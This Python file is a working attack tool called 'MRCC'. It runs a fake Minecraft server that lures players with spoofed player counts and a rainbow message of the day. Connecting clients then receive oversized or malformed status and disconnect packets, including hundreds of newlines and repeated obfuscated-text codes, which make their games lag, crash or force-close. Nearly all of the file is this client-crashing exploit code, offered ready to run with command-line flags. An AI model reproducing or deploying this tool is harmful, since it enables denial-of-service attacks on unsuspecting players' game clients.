import os
import sys
import json
import socket
import struct
import argparse
import itertools

from typing import *

from rich.console import Console
from rich.table import Table

console = Console(
)

VERSION = 2.0
AUTHOR = 'dropskid'

BANNER = f'''
[red]
[green].--------------------------.-------------.[/green]
|   __ _  ________________ [pink]: [white]MRCC[/white]        :[/pink]
|  /  ' \/ __/ __/ __/ __/ [pink]: [white]version {VERSION}[/white] :[/pink]
| /_/_/_/\__/_/  \__/\__/  [pink]: [white]by {AUTHOR}[/white] :[/pink]
[green]'--------------------------'-------------'[/green]
[/red]
'''

console.print(BANNER)

parser = argparse.ArgumentParser(usage='%(prog)s [options]')

server_options = parser.add_argument_group('server options')

server_options.add_argument('-l', '--lhost', default='0.0.0.0', required=False, metavar='', help='local host (default: 0.0.0.0)', dest='host', type=str)
server_options.add_argument('-p', '--port', default=1337, required=False, metavar='', help='local port (default: 1337)', dest='port', type=int)

minecraft_options = parser.add_argument_group('minecraft options')
minecraft_options.add_argument('-m', '--message', default='hello world', required=False, metavar='', help='motd\'s message', dest='message', type=str)
minecraft_options.add_argument('-v', '--version', default='friendlyspigot', required=False, metavar='', help='server\'s version', dest='version', type=str)
minecraft_options.add_argument('--online-players', default=53, required=False, metavar='', help='spoofed online players', dest='players_online', type=int)
minecraft_options.add_argument('--max-players', default=200, required=False, metavar='', help='spoofed max players', dest='players_max', type=int)


crashing_options = parser.add_argument_group('crashing options')
crashing_options.add_argument('--slp-lag', default=None, required=False, action='store_true', help='make the user\'s minecraft lag when he ping the server', dest='motd_lag')
crashing_options.add_argument('--join-crash', default=None, required=False, action='store_true', help='crash the user\'s minecraft when he joins the server', dest='join_crash')
crashing_options.add_argument('--no-return', default=None, required=False, action='store_true', help='force the user to close minecraft after connecting to the server', dest='force_close')


args = parser.parse_args()

LHOST = args.host
LPORT = args.port
MESSAGE = args.message
VERSION = args.version
ONLINE_PLAYERS = args.players_online
MAX_PLAYERS = args.players_max

if not args.motd_lag and not args.join_crash and not args.force_close:
    parser.print_help()
    sys.exit(-1)

def make_rainbow(message: str) -> str:
    colors = itertools.cycle(['§a', '§2', '§b', '§3', '§c', '§4', '§d', '§5', '§e', '§6', '§f', '§7'])
    out = ''
    for char in message:
        out += next(colors) + char
    return out

def varint_unpack(s: bytes) -> Tuple[int, str]:
    d, l = 0, 0
    length = len(s)
    if length > 5:
        length = 5
    for i in range(length):
        l += 1
        b = s[i]
        d |= (b & 0x7F) << 7 * i
        if not b & 0x80:
            break
    return (d, s[l:])


def varint_pack(d: int) -> bytes:
    o = b''
    for _ in range(5):
        b = d & 0x7F
        d >>= 7
        o += struct.pack("B", b | (0x80 if d > 0 else 0))
        if d == 0:
            break
    return o

def data_pack(data: bytes) -> bytes:
    return varint_pack(len(data)) + data

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

server.bind((LHOST, LPORT))

console.log('fake server server listening on %s:%s' % (LHOST, LPORT))
server.listen(1337)

while True:
    try:
        remote_socket, remote_addr = server.accept()
        try:
            buf = remote_socket.recv(1)
            packet_lenght, _ = varint_unpack(buf)

            data = remote_socket.recv(packet_lenght)
            packet_id, data = varint_unpack(data)

            packet_id = hex(packet_id)
            
            if packet_id == '0x0' and data.endswith(b'\x01'):
                console.log('%s:%s has pinged the server' % (remote_addr[0], remote_addr[1]))
                payload = json.dumps({
                    'version': {
                        'name': '\n' * 733 if args.motd_lag else VERSION,
                        'protocol': varint_unpack(data)[0] 
                    }, 'players': {
                        'max': MAX_PLAYERS,
                        'online': ONLINE_PLAYERS,
                    }, 
                    'description': make_rainbow(MESSAGE) + ('\n' * 5) + ('§ka' * 64 + '\n') * 60 if args.motd_lag else make_rainbow(MESSAGE), 
                    'modinfo': {
                        'type': 'FML', 
                        'modList': []
                    },
                }).encode()

                packet = data_pack(b'\x00' + data_pack(payload))
                remote_socket.send(packet)
            
            elif packet_id == '0x0' and data.endswith(b'\x02'):
                console.log('%s:%s is joining the server' % (remote_addr[0], remote_addr[1]))

                if args.join_crash:
                    packet = data_pack(b'\x00' + data_pack(b'{"text":"' + (b'\n' * 16384) + b'"}'))
                    remote_socket.send(packet)

                elif args.force_close:
                    packet = data_pack(b'\x00' + data_pack(b'{"text":"' + make_rainbow('no_return,' * 1000).encode('utf-8') + b'"}'))
                    remote_socket.send(packet)
            remote_socket.close()
        except:
            pass

    except KeyboardInterrupt:
        x = input('are you sure you want to exit (y/n): ').lower()
        if x == 'y':
            console.log('stopping server...')
            server.close()
            console.log('exiting...')
            sys.exit(0)
        elif x == 'n':
            pass